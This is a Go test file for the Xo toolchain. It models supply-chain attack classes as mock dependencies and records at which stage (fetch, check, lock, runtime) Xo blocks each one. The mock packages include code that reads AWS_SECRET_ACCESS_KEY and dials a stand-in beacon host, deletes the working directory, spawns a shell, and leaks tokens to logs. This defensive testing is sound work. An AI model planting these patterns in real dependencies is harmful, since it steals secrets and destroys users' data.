package main

import (
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	"github.com/xo-lang/xo/internal/mod/modtest"
)

// TestSupplyChainAttacks replays attack classes from the Backstabber's
// Knife Collection taxonomy (Ohm et al., DIMVA 2020) as small malicious
// Xo dependencies and consumers, and records the first stage at which Xo
// blocks each: fetch (no code runs), check, lock, runtime (attenuation),
// or not blocked. Every "malicious" behaviour here is benign and
// test-only (it dials a fake host, reads a fake variable, writes a
// MemFs); nothing leaves the test. The result is written to
// bench/results/supply-chain-2026-10-11.md.
//
// The attacks are modelled by behavioural class, not as the 51 specific
// npm/PyPI packages Flix replicated (those are language specific); see
// the result file's caveats on comparability.
func TestSupplyChainAttacks(t *testing.T) {
	results := []scResult{}
	for _, a := range scAttacks {
		stage, detail := a.run(t)
		results = append(results, scResult{Attack: a.name, Class: a.class, Stage: stage, Detail: detail, Want: a.want})
		if stage != a.want {
			t.Errorf("%s: blocked at %q, expected %q (%s)", a.name, stage, a.want, detail)
		}
	}
	// the run time rows again on the native backends (decision 0175):
	// reported apart, they are the same scenarios
	var natives []scResult
	if !testing.Short() {
		for _, be := range nativeBackends(t) {
			for _, a := range scAttacks {
				if a.native == nil {
					continue
				}
				stage, detail := a.native(t, []string{"--no-gc", "--backend=" + be})
				natives = append(natives, scResult{Attack: a.name + " (" + be + ", --no-gc)", Class: a.class, Stage: stage, Detail: detail, Want: a.want})
				if stage != a.want {
					t.Errorf("%s on %s: blocked at %q, expected %q (%s)", a.name, be, stage, a.want, detail)
				}
			}
		}
	}
	if os.Getenv("XO_SC_REPORT") != "" {
		writeSCReport(t, results, natives)
	}
}

type scResult struct {
	Attack, Class, Stage, Detail, Want string
}

type scAttack struct {
	name  string
	class string
	want  string // expected blocking stage
	run   func(t *testing.T) (stage, detail string)
	// native runs the consumer's test with the flags of a native build
	// (rows blocked at run time, decision 0175); nil for the others
	native func(t *testing.T, flags []string) (stage, detail string)
}

// scNative is an attack blocked at run time by a consumer test: run is
// test with no flags (the Go backend), native the same with flags.
func scNative(a scAttack, test func(t *testing.T, flags []string) (string, string)) scAttack {
	a.run = func(t *testing.T) (string, string) { return test(t, nil) }
	a.native = test
	return a
}

// scWorld sets up a module world from source and returns the consumer dir.
func scWorld(t *testing.T, repos map[string]string, consumer map[string]string) string {
	t.Helper()
	repoWorld(t, repos)
	ws := t.TempDir()
	t.Setenv("XO_BUILD_DIR", filepath.Join(ws, ".build"))
	app := filepath.Join(ws, "app")
	modtest.WriteFiles(t, app, consumer)
	return app
}

const scStageFetch = "fetch"
const scStageCheck = "check"
const scStageLock = "lock"
const scStageRuntime = "runtime"
const scStageNone = "not blocked"

var scAttacks = []scAttack{
	{
		name:  "exfiltrate env over net, no ceiling",
		class: "data exfiltration",
		want:  scStageNone,
		run: func(t *testing.T) (string, string) {
			app := scWorld(t, map[string]string{
				"evil.test/beacon@v1.0.0/xo.mod": "module evil.test/beacon\nedition preview\n",
				"evil.test/beacon@v1.0.0/b.xo":   "pub fn report(net: Net, env: Env) -> Bool uses net.dial, env {\n  let secret = env.get(\"AWS_SECRET_ACCESS_KEY\") ?? \"\"\n  net.dial(\"beacon.evil.test:443\").is_ok() && secret.len() >= 0\n}\n",
			}, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/beacon v1.0.0\n",
				"main/main.xo": "use evil.test/beacon\n\nfn main(os: Os) {\n  os.stdio.println(\"${beacon.report(os.net, os.env)}\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			if xo(t, "check", app).code != 0 {
				return scStageCheck, "unexpected check failure"
			}
			// the reach is visible in the signature and recorded in the
			// lock, but nothing blocks it: the consumer granted os.net
			// and os.env and set no ceiling.
			return scStageNone, "effects net.dial, env visible in the API and recorded in xo.lock; xo audit surfaces them, but the consumer granted the capabilities and set no ceiling"
		},
	},
	{
		name:  "exfiltrate env over net, ceiling uses none",
		class: "data exfiltration",
		want:  scStageCheck,
		run: func(t *testing.T) (string, string) {
			app := scWorld(t, map[string]string{
				"evil.test/beacon@v1.0.0/xo.mod": "module evil.test/beacon\nedition preview\n",
				"evil.test/beacon@v1.0.0/b.xo":   "pub fn report(net: Net) -> Bool uses net.dial {\n  net.dial(\"beacon.evil.test:443\").is_ok()\n}\n",
			}, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/beacon v1.0.0 uses none\n",
				"main/main.xo": "use evil.test/beacon\n\nfn main(os: Os) {\n  os.stdio.println(\"${beacon.report(os.net)}\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			return scStageFromCheck(t, app, "XO1309")
		},
	},
	scNative(scAttack{
		name:  "exfiltrate over net, attenuated capability",
		class: "data exfiltration",
		want:  scStageRuntime,
	}, func(t *testing.T, flags []string) (string, string) {
		app := scWorld(t, map[string]string{
			"evil.test/beacon@v1.0.0/xo.mod": "module evil.test/beacon\nedition preview\n",
			"evil.test/beacon@v1.0.0/b.xo":   "pub fn report(net: Net) -> Bool uses net.dial {\n  net.dial(\"beacon.evil.test:443\").is_ok()\n}\n",
		}, map[string]string{
			"xo.mod": "module example.com/app\nedition preview\n\nrequire evil.test/beacon v1.0.0 uses net.dial\n",
			"app_test.xo": "use evil.test/beacon\n\ntest \"the beacon is denied outside the allowed host\" {\n" +
				"  let net = os.net.only([\"api.good.test\"])\n  expect(beacon.report(net)) == false\n}\n",
		})
		xo(t, "mod", "tidy", "--dir", app).want(0)
		r := xo(t, append(append([]string{"test"}, flags...), app)...)
		if r.code == 0 && strings.Contains(r.out, "passed") {
			return scStageRuntime, "os.net.only([...]) denies the dial at run time (NetErr.Denied), proven by a consumer test"
		}
		return scStageNone, "test did not pass: " + r.out + r.err
	}),
	{
		name:  "write files (sabotage), ceiling uses none",
		class: "sabotage",
		want:  scStageCheck,
		run: func(t *testing.T) (string, string) {
			app := scWorld(t, map[string]string{
				"evil.test/wipe@v1.0.0/xo.mod": "module evil.test/wipe\nedition preview\n",
				"evil.test/wipe@v1.0.0/w.xo":   "pub fn clean(fs: Fs) -> Bool uses fs.write {\n  fs.remove_all(\".\").is_ok()\n}\n",
			}, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/wipe v1.0.0 uses none\n",
				"main/main.xo": "use evil.test/wipe\n\nfn main(os: Os) {\n  os.stdio.println(\"${wipe.clean(os.fs)}\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			return scStageFromCheck(t, app, "XO1309")
		},
	},
	{
		name:  "spawn a process, ceiling uses none",
		class: "backdoor/dropper",
		want:  scStageCheck,
		run: func(t *testing.T) (string, string) {
			app := scWorld(t, map[string]string{
				"evil.test/drop@v1.0.0/xo.mod": "module evil.test/drop\nedition preview\n",
				"evil.test/drop@v1.0.0/d.xo":   "pub fn install(proc: Proc) -> Bool uses proc {\n  proc.run(\"sh\", [\"-c\", \"echo dropped\"]).is_ok()\n}\n",
			}, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/drop v1.0.0 uses none\n",
				"main/main.xo": "use evil.test/drop\n\nfn main(os: Os) {\n  os.stdio.println(\"${drop.install(os.proc)}\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			return scStageFromCheck(t, app, "XO1309")
		},
	},
	{
		name:  "install-time hook",
		class: "install hook",
		want:  scStageFetch,
		run: func(t *testing.T) (string, string) {
			// Xo runs no code at fetch or build setup (core 4.2): a
			// dependency has no hook, init, or build script. Its code runs
			// only when the consumer calls it. A dependency that puts an
			// effect at the top level is a compile error (no top-level
			// statements).
			app := scWorld(t, map[string]string{
				"evil.test/hook@v1.0.0/xo.mod": "module evil.test/hook\nedition preview\n",
				"evil.test/hook@v1.0.0/h.xo":   "pub fn safe() -> Int { 1 }\n",
			}, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/hook v1.0.0\n",
				"main/main.xo": "use evil.test/hook\n\nfn main(os: Os) {\n  os.stdio.println(\"${hook.safe()}\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			xo(t, "check", app).want(0)
			return scStageFetch, "no fetch, install, or build hook exists (core 4.2: no code runs at fetch or build setup); a dependency's code runs only when the consumer calls it"
		},
	},
	{
		name:  "import-time execution",
		class: "typosquat/import trigger",
		want:  scStageCheck,
		run: func(t *testing.T) (string, string) {
			// A dependency that tries to act at import has nowhere to put
			// the code: Xo has no top-level statements, so a top-level
			// effect is a parse/check error (there is no module init).
			app := scWorld(t, map[string]string{
				"evil.test/typo@v1.0.0/xo.mod": "module evil.test/typo\nedition preview\n",
				"evil.test/typo@v1.0.0/t.xo":   "pub fn f() -> Int { 1 }\n\nos.net.dial(\"beacon.evil.test:443\")\n",
			}, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/typo v1.0.0\n",
				"main/main.xo": "use evil.test/typo\n\nfn main(os: Os) {\n  os.stdio.println(\"${typo.f()}\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			r := xo(t, "check", "--json", app)
			if r.code != 0 {
				return scStageCheck, "a top-level statement in a dependency is a compile error (" + firstCode(t, r.out) + "); Xo has no module init or import-time execution"
			}
			return scStageNone, "dependency with top-level code checked clean unexpectedly"
		},
	},
	{
		name:  "logging exfiltration, ceiling forbids log",
		class: "data exfiltration",
		want:  scStageCheck,
		run: func(t *testing.T) (string, string) {
			app := scWorld(t, map[string]string{
				"evil.test/logleak@v1.0.0/xo.mod": "module evil.test/logleak\nedition preview\n",
				"evil.test/logleak@v1.0.0/l.xo":   "use std/log\n\npub fn audit(token: Str) uses log {\n  log.info(\"request\", {\"token\": token})\n}\n",
			}, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/logleak v1.0.0 uses none\n",
				"main/main.xo": "use evil.test/logleak\n\nfn main(os: Os) {\n  logleak.audit(\"secret\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			return scStageFromCheck(t, app, "XO1309")
		},
	},
	{
		name:  "logging exfiltration, log allowed",
		class: "data exfiltration",
		want:  scStageNone,
		run: func(t *testing.T) (string, string) {
			app := scWorld(t, map[string]string{
				"evil.test/logleak@v1.0.0/xo.mod": "module evil.test/logleak\nedition preview\n",
				"evil.test/logleak@v1.0.0/l.xo":   "use std/log\n\npub fn audit(token: Str) uses log {\n  log.info(\"request\", {\"token\": token})\n}\n",
			}, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/logleak v1.0.0\n",
				"main/main.xo": "use evil.test/logleak\n\nfn main(os: Os) {\n  logleak.audit(\"secret\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			xo(t, "check", app).want(0)
			return scStageNone, "the `log` effect makes it visible in the API (uses log) and a ceiling can forbid it, but when the consumer allows log the record is still written"
		},
	},
	{
		name:  "C binding that lies about effects, unvouched",
		class: "effect laundering",
		want:  scStageCheck,
		run: func(t *testing.T) (string, string) {
			app := scWorld(t, map[string]string{
				"evil.test/czip@v1.0.0/xo.mod": "module evil.test/czip\nedition preview\n",
				"evil.test/czip@v1.0.0/zip.h":  "int zip_level(void);\n",
				"evil.test/czip@v1.0.0/zip.c":  "int zip_level(void) { return 6; }\n",
				"evil.test/czip@v1.0.0/z.xo":   "use c \"zip.h\" link \"zip.c\" as czip uses none\n\npub fn level() -> Int32 { czip.zip_level() }\n",
			}, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/czip v1.0.0\n",
				"main/main.xo": "use evil.test/czip\n\nfn main(os: Os) {\n  os.stdio.println(\"${czip.level()}\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			r := xo(t, "check", "--no-gc", "--json", app)
			if r.code != 0 && strings.Contains(r.out, "XO1316") {
				return scStageCheck, "the dependency's own `use c ... uses none` does not count: the consumer must vouch (XO1316), and the unvouched binding is charged its worst-case effect (ffi)"
			}
			return scStageNone, "no XO1316: " + r.out
		},
	},
	{
		name:  "C binding that lies, consumer vouches wrongly",
		class: "effect laundering",
		want:  scStageNone,
		run: func(t *testing.T) (string, string) {
			app := scWorld(t, map[string]string{
				"evil.test/czip@v1.0.0/xo.mod": "module evil.test/czip\nedition preview\n",
				"evil.test/czip@v1.0.0/zip.h":  "int zip_level(void);\n",
				"evil.test/czip@v1.0.0/zip.c":  "int zip_level(void) { return 6; }\n",
				"evil.test/czip@v1.0.0/z.xo":   "use c \"zip.h\" link \"zip.c\" as czip uses none\n\npub fn level() -> Int32 { czip.zip_level() }\n",
			}, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/czip v1.0.0\n\nvouch evil.test/czip v1.0.0 c \"zip.h\" uses none\n",
				"main/main.xo": "use evil.test/czip\n\nfn main(os: Os) {\n  os.stdio.println(\"${czip.level()}\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			xo(t, "check", "--no-gc", app).want(0)
			return scStageNone, "a vouch is a human review; a consumer that vouches `uses none` for C that actually does I/O is not protected (Xo cannot see into C). The vouch records who attested it"
		},
	},
	{
		name:  "malicious update adds net effect",
		class: "malicious update",
		want:  scStageLock,
		run: func(t *testing.T) (string, string) {
			repoWorld(t, map[string]string{
				"evil.test/helper@v1.0.0/xo.mod": "module evil.test/helper\nedition preview\n",
				"evil.test/helper@v1.0.0/h.xo":   "pub fn slug(s: Str) -> Str { s }\n",
				"evil.test/helper@v1.1.0/xo.mod": "module evil.test/helper\nedition preview\n",
				"evil.test/helper@v1.1.0/h.xo":   "pub fn slug(s: Str) -> Str { s }\npub fn phone(net: Net) -> Bool uses net.dial { net.dial(\"beacon.evil.test:443\").is_ok() }\n",
			})
			ws := t.TempDir()
			app := filepath.Join(ws, "app")
			modtest.WriteFiles(t, app, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/helper v1.0.0\n",
				"main/main.xo": "use evil.test/helper\n\nfn main(os: Os) {\n  os.stdio.println(\"${helper.slug(\"x\")}\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			r := xo(t, "get", "--json", "--dir", app, "evil.test/helper@v1.1.0")
			if r.code != 0 && strings.Contains(r.out, "XO1317") {
				return scStageLock, "the effect lock records v1.0.0 as `effects none`; the update to v1.1.0 adds net.dial, so `xo get` fails with XO1317 and writes nothing (accept with `xo mod accept-effects`)"
			}
			return scStageNone, "update not blocked: " + r.out
		},
	},
	{
		name:  "malicious update adds effect, with a ceiling",
		class: "malicious update",
		want:  scStageCheck,
		run: func(t *testing.T) (string, string) {
			repoWorld(t, map[string]string{
				"evil.test/helper@v1.0.0/xo.mod": "module evil.test/helper\nedition preview\n",
				"evil.test/helper@v1.0.0/h.xo":   "pub fn slug(s: Str) -> Str { s }\n",
				"evil.test/helper@v1.1.0/xo.mod": "module evil.test/helper\nedition preview\n",
				"evil.test/helper@v1.1.0/h.xo":   "pub fn slug(s: Str) -> Str uses net.dial { s }\n",
			})
			ws := t.TempDir()
			app := filepath.Join(ws, "app")
			modtest.WriteFiles(t, app, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/helper v1.0.0 uses none\n",
				"main/main.xo": "use evil.test/helper\n\nfn main(os: Os) {\n  os.stdio.println(\"${helper.slug(\"x\")}\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			// accept the lock change to isolate the ceiling check
			xo(t, "get", "--accept-effects", "--dir", app, "evil.test/helper@v1.1.0").want(0)
			return scStageFromCheck(t, app, "XO1309")
		},
	},
	{
		name:  "pure malice: wrong result (swapped address)",
		class: "logic/no effect",
		want:  scStageNone,
		run: func(t *testing.T) (string, string) {
			app := scWorld(t, map[string]string{
				"evil.test/pay@v1.0.0/xo.mod": "module evil.test/pay\nedition preview\n",
				"evil.test/pay@v1.0.0/p.xo":   "pub fn payee(requested: Str) -> Str { \"attacker-account\" }\n",
			}, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/pay v1.0.0 uses none\n",
				"main/main.xo": "use evil.test/pay\n\nfn main(os: Os) {\n  os.stdio.println(\"${pay.payee(\"alice\")}\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			xo(t, "check", app).want(0)
			return scStageNone, "pure computation performs no effect; returning the wrong value is not an authority misuse, so no effect/capability defense applies (contracts and tests are the defense, not the supply-chain layer)"
		},
	},
	{
		name:  "denial of service: unbounded loop",
		class: "sabotage/DoS",
		want:  scStageNone,
		run: func(t *testing.T) (string, string) {
			app := scWorld(t, map[string]string{
				"evil.test/spin@v1.0.0/xo.mod": "module evil.test/spin\nedition preview\n",
				"evil.test/spin@v1.0.0/s.xo":   "pub fn work(n: Int) -> Int {\n  var i = 0\n  var acc = 0\n  while i < n {\n    acc += i\n    i += 1\n  }\n  acc\n}\n",
			}, map[string]string{
				"xo.mod":       "module example.com/app\nedition preview\n\nrequire evil.test/spin v1.0.0 uses none\n",
				"main/main.xo": "use evil.test/spin\n\nfn main(os: Os) {\n  os.stdio.println(\"${spin.work(10)}\")\n}\n",
			})
			xo(t, "mod", "tidy", "--dir", app).want(0)
			xo(t, "check", app).want(0)
			return scStageNone, "a CPU/time DoS performs no capability effect, so no ceiling applies; with no budget the loop runs (task.with_budget bounds it, next row)"
		},
	},
	scNative(scAttack{
		name:  "denial of service: unbounded loop, with_budget",
		class: "sabotage/DoS",
		want:  scStageRuntime,
	}, func(t *testing.T, flags []string) (string, string) {
		return scBudgeted(t, "steps: 100000", "steps", flags)
	}),
	scNative(scAttack{
		name:  "denial of service: unbounded loop, with_budget cpu",
		class: "sabotage/DoS",
		want:  scStageRuntime,
	}, func(t *testing.T, flags []string) (string, string) {
		return scBudgeted(t, "cpu: 50ms", "cpu", flags)
	}),
}

// scBudgeted runs a consumer test that calls a dependency whose function
// never returns under task.with_budget(budget) and expects the budget to
// stop it with Exceeded(resource) (decision 0173).
func scBudgeted(t *testing.T, budget, resource string, flags []string) (string, string) {
	t.Helper()
	app := scWorld(t, map[string]string{
		"evil.test/spin@v1.0.0/xo.mod": "module evil.test/spin\nedition preview\n",
		"evil.test/spin@v1.0.0/s.xo":   "pub fn work() -> Int {\n  var i = 0\n  while true {\n    i += 1\n  }\n  i\n}\n",
	}, map[string]string{
		"xo.mod": "module example.com/app\nedition preview\n\nrequire evil.test/spin v1.0.0 uses none\n",
		"app_test.xo": "use std/task\nuse evil.test/spin\n\ntest \"the budget stops the dependency\" {\n" +
			"  let r = task.with_budget(os.clock, task.budget(" + budget + "), fn() -> Int { spin.work() })\n" +
			"  expect(r.err()) == Some(task.Budgeted.Exceeded(resource: \"" + resource + "\"))\n}\n",
	})
	xo(t, "mod", "tidy", "--dir", app).want(0)
	r := xo(t, append(append([]string{"test"}, flags...), app)...)
	if r.code == 0 && strings.Contains(r.out, "passed") {
		return scStageRuntime, "task.with_budget(" + budget + ") cancels the budgeted scope and the loop unwinds at its next iteration: Err(Exceeded(\"" + resource + "\")), proven by a consumer test"
	}
	return scStageNone, "test did not pass: " + r.out + r.err
}

// scStageFromCheck runs `xo check --json` and reports scStageCheck when
// code is among the diagnostics, else not blocked.
func scStageFromCheck(t *testing.T, app, code string) (string, string) {
	t.Helper()
	r := xo(t, "check", "--json", app)
	if r.code != 0 && diagHas(t, r.out, code) {
		return scStageCheck, "blocked at `xo check` with " + code
	}
	return scStageNone, "no " + code + ": " + r.out
}

func diagHas(t *testing.T, out, code string) bool {
	return strings.Contains(diagCodes(t, out), code)
}

func firstCode(t *testing.T, out string) string {
	cs := diagCodes(t, out)
	if i := strings.IndexByte(cs, ','); i >= 0 {
		return cs[:i]
	}
	return cs
}

// writeSCReport writes the measured table to bench/results.
func writeSCReport(t *testing.T, rs, natives []scResult) {
	byStage := map[string]int{}
	for _, r := range rs {
		byStage[r.Stage]++
	}
	blocked := len(rs) - byStage[scStageNone]
	var b strings.Builder
	fmt.Fprintf(&b, "<!-- generated by cmd/xo TestSupplyChainAttacks with XO_SC_REPORT=1 -->\n\n")
	fmt.Fprintf(&b, "## Measured result\n\n%d of %d attack scenarios blocked, by stage:\n\n", blocked, len(rs))
	fmt.Fprintf(&b, "| stage | count |\n|---|---|\n")
	for _, s := range []string{scStageFetch, scStageCheck, scStageLock, scStageRuntime, scStageNone} {
		fmt.Fprintf(&b, "| %s | %d |\n", s, byStage[s])
	}
	fmt.Fprintf(&b, "\n| attack | class | stage blocked | detail |\n|---|---|---|---|\n")
	sorted := append([]scResult{}, rs...)
	sort.SliceStable(sorted, func(i, j int) bool { return sorted[i].Class < sorted[j].Class })
	for _, r := range sorted {
		fmt.Fprintf(&b, "| %s | %s | %s | %s |\n", r.Attack, r.Class, r.Stage, r.Detail)
	}
	if len(natives) > 0 {
		// the same scenarios, not counted again
		fmt.Fprintf(&b, "\n### Native backends\n\nThe run time rows again with `xo test --no-gc` (decision 0175), not counted above:\n\n")
		fmt.Fprintf(&b, "| attack | class | stage blocked | detail |\n|---|---|---|---|\n")
		for _, r := range natives {
			fmt.Fprintf(&b, "| %s | %s | %s | %s |\n", r.Attack, r.Class, r.Stage, r.Detail)
		}
	}
	out := filepath.Join("..", "..", "bench", "results", "supply-chain-2026-10-11.generated.md")
	if err := os.WriteFile(out, []byte(b.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Logf("wrote %s", out)
}

